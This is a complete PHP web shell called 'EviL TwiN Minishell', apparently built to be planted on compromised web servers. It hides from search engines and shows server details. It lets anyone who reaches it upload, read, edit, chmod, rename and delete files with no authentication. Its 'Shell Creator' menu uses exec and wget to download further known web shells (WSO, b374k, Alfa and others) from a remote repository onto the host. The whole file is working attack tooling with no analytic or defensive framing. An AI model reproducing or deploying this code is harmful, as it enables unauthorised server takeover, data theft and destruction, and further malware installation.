<?php
error_reporting(0);
set_time_limit(0);

if(get_magic_quotes_gpc()){
foreach($_POST as $key=>$value){
$_POST[$key] = stripslashes($value);
}
}
echo '<!DOCTYPE HTML>
<html>
<head>
<meta name="author" content="Evil Twin">
<meta name="theme-color" content="#561000">
<meta name="robots" content="NOINDEX. NOFOLLOW, NOARCHIVE">
<link href="https://fonts.googleapis.com/css2?family=Inika&display=swap" rel="stylesheet">
<title>EviL TwiN Minishell</title>
<style>body { font-family: "Inika", serif; background-color: #561000; color:white;} tr:hover{ background-color: #970B00;}.first{ background-color: #970B00;}table{ border: 1px #FFFFFF solid;}a{color:white;text-decoration: none;}a:hover{color:lime;}input,select,textarea{border: 1px #FFFFFF solid;-moz-border-radius: 5px;-webkit-border-radius:5px;border-radius:5px;}</style>
</head>
<body>
<center><a href="?"><font size="5">EviL TwiN Mini$hell</font></a></center>
<table width="730" border ="0" cellpadding="3" cellspacing="1" align="center">
<tr><td><font color="white">eviltwin :</font> ';
if(isset($_GET['eviltwin'])){
$eviltwin = $_GET['eviltwin'];
}else{
$eviltwin = getcwd();
}
$eviltwin = str_replace('\\','/',$eviltwin);
$eviltwins = explode('/',$eviltwin);

foreach($eviltwins as $id=>$pat){
if($pat == '' && $id == 0){
$a = true;
echo '<a href="?eviltwin=/">/</a>';
continue;
}
if($pat == '') continue;
echo '<a href="?eviltwin=';
for($i=0;$i<=$id;$i++){
echo "$eviltwins[$i]";
if($i != $id) echo "/";
}
echo '">'.$pat.'</a>/';
}
echo '</td></tr><tr><td>';
$ip = gethostbyname($_SERVER['HTTP_HOST']);
$system = php_uname();
$sm = (@ini_get(strtolower("safe_mode")) == 'on') ? '<font>ON</font>' : '<font>OFF</font>';
if(isset($_FILES['file'])){
if(copy($_FILES['file']['tmp_name'],$eviltwin.'/'.$_FILES['file']['name'])){
echo '<font color="lime">Upload successfully</font><br />';
}else{
echo '<font color="white">Upload failed</font><br/>';
}
}
echo '<font>Safe Mode : '.$sm.'</font><br><font>Server IP : '.$ip.'</font><br><font>System : '.$system.'</font><br>
<form enctype="multipart/form-data" method="POST">
<font color="white">File Upload :</font> <input type="file" name="file">
<input type="submit" value="Go!">
</form><form method="post"><font>Shell Creator : </font><select name="eviltwin"><option selected>Select</option><option value="idx">Indoxploit (3)</option><option value="wso">Wso (4.2.5)</option><option value="b374k">B374k (3.2.3)</option><option value="marijuana">Marijuana (1)</option><option value="alfa">Alfa (4)</option><option value="noname">Noname (1)</option></select>
<input type="submit" name="enter" value="Get!"></center><br>';
if($_POST['eviltwin'] == 'idx') {
		$exec=exec('wget https://raw.githubusercontent.com/BOTKNTL/kontol/master/indoxploit.php -O idx.php');
 if(file_exists('./idx.php')){
   echo '<center><a href=./idx.php target="_blank">[ Click Here! ]</a></center><br>';}
else {
   echo '<center>Failed!</center><br>';}
} elseif($_POST['eviltwin'] == 'wso') {
 $exec=exec('wget https://raw.githubusercontent.com/BOTKNTL/kontol/master/wso425.php -O wso.php');
 if(file_exists('./wso.php')){
   echo '<center><a href=./wso.php target="_blank">[ Click Here! ]</a></center><br>';
} else {
   echo '<center>Failed!</center><br>';}
} elseif($_POST['eviltwin'] == 'b374k') {
	$exec=exec('wget https://raw.githubusercontent.com/BOTKNTL/kontol/master/b374k323.php -O b374k.php');
 if(file_exists('./b374k.php')){
   echo '<center><a href=./b374k.php target="_blank">[ Click Here! ]</a></center><br>';
} else {
   echo '<center>Failed!</center><br>';}
} elseif($_POST['eviltwin'] == 'marijuana') {
	$exec=exec('wget https://raw.githubusercontent.com/BOTKNTL/kontol/master/maricoli.php -O marijuana.php');
 if(file_exists('./marijuana.php')){
   echo '<center><a href=./marijuana.php target="_blank">[ Click Here! ]</a></center><br>';
} else {
   echo '<center>Failed!</center><br>';}
} elseif($_POST['eviltwin'] == 'alfa') {
	$exec=exec('wget https://raw.githubusercontent.com/BOTKNTL/kontol/master/alfatesla.php -O alfa.php');
 if(file_exists('./alfa.php')){
   echo '<center><a href=./alfa.php target="_blank">[ Click Here! ]</a></center><br>';
} else {
   echo '<center>Failed!</center><br>';}
} elseif($_POST['eviltwin'] == 'noname') {
	$exec=exec('wget https://raw.githubusercontent.com/BOTKNTL/kontol/master/nonameshell.php -O noname.php');
 if(file_exists('./noname.php')){
   echo '<center><a href=./noname.php target="_blank">[ Click Here! ]</a></center><br>';
 } else {
   echo '<center>Failed!</center><br>';}}
echo '</td></tr>';
if(isset($_GET['filesrc'])){
echo "<tr><td>Current File : ";
echo $_GET['filesrc'];
echo '</tr></td></table><br />';
echo('<pre>'.htmlspecialchars(file_get_contents($_GET['filesrc'])).'</pre>');
}elseif(isset($_GET['option']) && $_POST['opt'] != 'delete'){
echo '</table><br /><center>'.$_POST['eviltwin'].'<br /><br />';
if($_POST['opt'] == 'chmod'){
if(isset($_POST['perm'])){
if(chmod($_POST['eviltwin'],$_POST['perm'])){
echo '<font color="lime">Change permission successfully</font><br/>';
}else{
echo '<font color="red">Change permission failed</font><br />';
}
}
echo '<form method="POST">
Permission : <input name="perm" type="text" size="4" value="'.substr(sprintf('%o', fileperms($_POST['eviltwin'])), -4).'" />
<input type="hidden" name="eviltwin" value="'.$_POST['eviltwin'].'">
<input type="hidden" name="opt" value="chmod">
<input type="submit" value="Go" />
</form>';
}elseif($_POST['opt'] == 'rename'){
if(isset($_POST['newname'])){
if(rename($_POST['eviltwin'],$eviltwin.'/'.$_POST['newname'])){
echo '<font color="lime">Rename successfully</font><br/>';
}else{
echo '<font color="white">Rename failed</font><br />';
}
$_POST['name'] = $_POST['newname'];
}
echo '<form method="POST">
New Name : <input name="newname" type="text" size="20" value="'.$_POST['name'].'" />
<input type="hidden" name="eviltwin" value="'.$_POST['eviltwin'].'">
<input type="hidden" name="opt" value="rename">
<input type="submit" value="Go" />
</form>';
}elseif($_POST['opt'] == 'edit'){
if(isset($_POST['src'])){
$fp = fopen($_POST['eviltwin'],'w');
if(fwrite($fp,$_POST['src'])){
echo '<font color="lime">File edit successfully</font><br/>';
}else{
echo '<font color="white">Failed to edit file</font><br/>';
}
fclose($fp);
}
echo '<form method="POST">
<textarea cols=80 rows=20 name="src">'.htmlspecialchars(file_get_contents($_POST['eviltwin'])).'</textarea><br />
<input type="hidden" name="eviltwin" value="'.$_POST['eviltwin'].'">
<input type="hidden" name="opt" value="edit">
<input type="submit" value="Save" />
</form>';
}
echo '</center>';
}else{
echo '</table><br/><center>';
if(isset($_GET['option']) && $_POST['opt'] == 'delete'){
if($_POST['type'] == 'dir'){
if(rmdir($_POST['eviltwin'])){
echo '<font color="lime">Directory deleted successfully</font><br/>';
}else{
echo '<font color="red">Delete directory failed</font><br/>';
}
}elseif($_POST['type'] == 'file'){
if(unlink($_POST['eviltwin'])){
echo '<font color="lime">File Deleted</font><br/>';
}else{
echo '<font color="white">File Failed to Delete</font><br/>';
}
}
}
echo '</center>';
if(function_exists('opendir')) {
	if($opendir = opendir($eviltwin)) {
		while(($readdir = readdir($opendir)) !== false) {
			$scandir[] = $readdir;
		}
		closedir($opendir);
	}
	sort($scandir);
} else {
	$scandir = scandir($eviltwin);
}
echo '<div id="content"><table width="730" border="0" cellpadding="3" cellspacing="1" align="center">
<tr class="first">
<td><center>NAME</center></td>
<td><center>SIZE</center></td>
<td><center>PERMISSION</center></td>
<td><center>MODIFY</center></td>
</tr>';

foreach($scandir as $dir){
if(!is_dir($eviltwin.'/'.$dir) || $dir == '.' || $dir == '..') continue;
echo '<tr>
<td><a href="?eviltwin='.$eviltwin.'/'.$dir.'">'.$dir.'</a></td>
<td><center>--</center></td>
<td><center>';
if(is_writable($eviltwin.'/'.$dir)) echo '<font color="lime">';
elseif(!is_readable($eviltwin.'/'.$dir)) echo '<font color="white">';
echo perms($eviltwin.'/'.$dir);
if(is_writable($eviltwin.'/'.$dir) || !is_readable($eviltwin.'/'.$dir)) echo '</font>';

echo '</center></td>
<td><center><form method="POST" action="?option&eviltwin='.$eviltwin.'">
<select name="opt">
<option value="">Select</option>
<option value="delete">Delete</option>
<option value="chmod">Chmod</option>
<option value="rename">Rename</option>
</select>
<input type="hidden" name="type" value="dir">
<input type="hidden" name="name" value="'.$dir.'">
<input type="hidden" name="eviltwin" value="'.$eviltwin.'/'.$dir.'">
<input type="submit" value=">">
</form></center></td>
</tr>';
}
echo '<tr class="first"><td></td><td></td><td></td><td></td></tr>';
foreach($scandir as $file){
if(!is_file($eviltwin.'/'.$file)) continue;
$size = filesize($eviltwin.'/'.$file)/1024;
$size = round($size,3);
if($size >= 1024){
$size = round($size/1024,2).' MB';
}else{
$size = $size.' KB';
}

echo '<tr>
<td><a href="?filesrc='.$eviltwin.'/'.$file.'&eviltwin='.$eviltwin.'">'.$file.'</a></td>
<td><center>'.$size.'</center></td>
<td><center>';
if(is_writable($eviltwin.'/'.$file)) echo '<font color="lime">';
elseif(!is_readable($eviltwin.'/'.$file)) echo '<font color="white">';
echo perms($eviltwin.'/'.$file);
if(is_writable($eviltwin.'/'.$file) || !is_readable($eviltwin.'/'.$file)) echo '</font>';
echo '</center></td>
<td><center><form method="POST" action="?option&eviltwin='.$eviltwin.'">
<select name="opt">
<option value="">Select</option>
<option value="delete">Delete</option>
<option value="chmod">Chmod</option>
<option value="rename">Rename</option>
<option value="edit">Edit</option>
</select>
<input type="hidden" name="type" value="file">
<input type="hidden" name="name" value="'.$file.'">
<input type="hidden" name="eviltwin" value="'.$eviltwin.'/'.$file.'">
<input type="submit" value=">">
</form></center></td>
</tr>';
}
echo '</table>
</div>';
}
echo '<center><br><a href="https://github.com/eviltwin-dev"><font color="white">&copy Evil Twin</font></a></center>
</body>
</html>';
function perms($file){
$perms = fileperms($file);

if (($perms & 0xC000) == 0xC000) {
// Socket
$info = 's';
} elseif (($perms & 0xA000) == 0xA000) {
// Symbolic Link
$info = 'l';
} elseif (($perms & 0x8000) == 0x8000) {
// Regular
$info = '-';
} elseif (($perms & 0x6000) == 0x6000) {
// Block special
$info = 'b';
} elseif (($perms & 0x4000) == 0x4000) {
// Directory
$info = 'd';
} elseif (($perms & 0x2000) == 0x2000) {
// Character special
$info = 'c';
} elseif (($perms & 0x1000) == 0x1000) {
// FIFO pipe
$info = 'p';
} else {
// Unknown
$info = 'u';
}

// Owner
$info .= (($perms & 0x0100) ? 'r' : '-');
$info .= (($perms & 0x0080) ? 'w' : '-');
$info .= (($perms & 0x0040) ?
(($perms & 0x0800) ? 's' : 'x' ) :
(($perms & 0x0800) ? 'S' : '-'));

// Group
$info .= (($perms & 0x0020) ? 'r' : '-');
$info .= (($perms & 0x0010) ? 'w' : '-');
$info .= (($perms & 0x0008) ?
(($perms & 0x0400) ? 's' : 'x' ) :
(($perms & 0x0400) ? 'S' : '-'));

// World
$info .= (($perms & 0x0004) ? 'r' : '-');
$info .= (($perms & 0x0002) ? 'w' : '-');
$info .= (($perms & 0x0001) ?
(($perms & 0x0200) ? 't' : 'x' ) :
(($perms & 0x0200) ? 'T' : '-'));

return $info;
}
?>
